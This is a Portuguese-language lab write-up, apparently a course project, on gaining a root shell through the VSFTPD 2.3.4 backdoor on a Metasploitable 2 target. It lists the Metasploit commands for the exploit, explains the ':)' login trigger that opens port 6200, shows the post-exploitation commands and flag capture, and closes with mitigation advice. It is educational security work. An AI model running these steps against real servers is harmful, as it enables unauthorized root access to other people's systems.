# Exploração de Vulnerabilidade: VSFTPD 2.3.4 Backdoor

Este projeto prático faz parte do módulo de Exploração de Vulnerabilidades. O laboratório demonstra o comprometimento total de um servidor FTP rodando uma versão historicamente comprometida do daemon VSFTPD, utilizando o Metasploit Framework para obter uma shell com privilégios de root (Administrador).

> **Aviso Legal:** Este projeto foi realizado em um ambiente de laboratório estritamente controlado e isolado (VirtualBox / Metasploitable 2). Todas as técnicas aqui documentadas têm fins educacionais e de pesquisa acadêmica em Segurança da Informação.

## Objetivo do Projeto
Compreender como vulnerabilidades inseridas diretamente no código-fonte de softwares de terceiros (Supply Chain Attack) podem comprometer um servidor e como frameworks de exploração automatizam a invasão. O projeto finaliza com a captura de uma flag (CTF) para comprovar o acesso.

## Topologia e Ambiente
* **Atacante:** Kali Linux (192.168.56.102)
* **Alvo Vulnerável:** Metasploitable 2 (192.168.56.101)
* **Serviço Alvo:** FTP na porta 21 (VSFTPD 2.3.4)

## Metodologia

### 1. Preparação do Ambiente (Target)
Para simular um ambiente de Capture The Flag (CTF) e comprovar a invasão, um arquivo de texto restrito foi criado previamente no servidor alvo:

    echo "DIO{vsftpd_234_backdoor_exploit_sucesso}" > flag.txt

### 2. Configuração do Metasploit Framework
No Kali Linux, o console do Metasploit (`msfconsole`) foi iniciado para buscar e carregar o exploit específico para a falha do VSFTPD 2.3.4.

* **Histórico da Falha:** O arquivo de instalação original desta versão do VSFTPD foi alterado maliciosamente em 2011. Ao enviar uma sequência específica de caracteres no login (um smiley face `:)`), o backdoor abre silenciosamente a porta 6200 no servidor, garantindo acesso root ao invasor.

    msfconsole
    msf > search vsftpd
    msf > use exploit/unix/ftp/vsftpd_234_backdoor

### 3. Definição de Parâmetros e Execução
O endereço IP do alvo (`RHOSTS`) foi configurado e o ataque foi disparado. O Metasploit utiliza por padrão um payload interativo para este exploit (`cmd/unix/interact`), dispensando configurações extras de payload.

    msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
    msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit

### 4. Pós-Exploração e Captura da Flag
Após a execução bem-sucedida, uma sessão de shell foi estabelecida. Os comandos abaixo validam o nível de privilégio obtido e capturam a flag de comprovação.

    # Verificando os privilégios obtidos
    whoami
    > root

    # Capturando a flag do desafio
    cat flag.txt
    > DIO{vsftpd_234_backdoor_exploit_sucesso}
    nano flag.txt

## Mitigação e Boas Práticas
Para proteger ambientes corporativos contra backdoors e falhas em serviços FTP:
1. **Gestão de Patch e Atualizações:** Manter softwares sempre em suas versões mais recentes e seguras. A falha do VSFTPD 2.3.4 foi corrigida rapidamente após sua descoberta.
2. **Validação de Integridade (Checksums):** Ao baixar pacotes da internet para servidores, sempre validar a hash (SHA256, MD5) contra a hash oficial do desenvolvedor para evitar a instalação de softwares alterados.
3. **Restrição de Rede (Firewall):** Implementar regras estritas de Inbound/Outbound. Uma regra bloqueando portas altas (como a 6200 aberta pelo backdoor) teria impedido o invasor de se conectar ao shell oculto.
4. **Desativação de Serviços Obsoletos:** Se possível, substituir o FTP clássico (que trafega dados em texto claro) por alternativas seguras como SFTP.
